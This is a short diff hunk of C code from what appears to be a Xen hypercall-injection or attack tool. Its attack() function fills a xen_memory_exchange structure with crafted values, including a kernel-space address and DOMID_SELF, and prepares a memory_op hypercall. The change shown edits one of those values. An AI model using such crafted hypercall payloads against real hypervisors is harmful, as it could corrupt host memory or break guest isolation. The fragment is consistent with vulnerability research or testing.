@@ -179,7 +179,7 @@ return (__MYUL)__mres;
 int hinjHypNum = 1;
 unsigned long int hinjStructAddr;
 void attack(void){
-unsigned long hinjValue[9] = {16,1,1,1,16,1,18446603885977010000,DOMID_SELF,0};//18446744071609552026,18446603885977010000
+unsigned long hinjValue[9] = {16,1,1,DOMID_SELF,16,1,18446603885977010000,DOMID_SELF,0};//18446744071609552026,18446603885977010000
 FILL_STRUCTARGS9(xen_memory_exchange, in.nr_extents, hinjValue[0], in.extent_order, hinjValue[1], in.extent_start, hinjValue[2], in.domid, hinjValue[3], out.nr_extents, hinjValue[4], out.extent_order, hinjValue[5], out.extent_start, hinjValue[6], out.domid, hinjValue[7],nr_exchanged,hinjValue[8]);
 unsigned long hinjParams[2] = {11,hinjStructAddr};
 int hinjHypNum = 12;
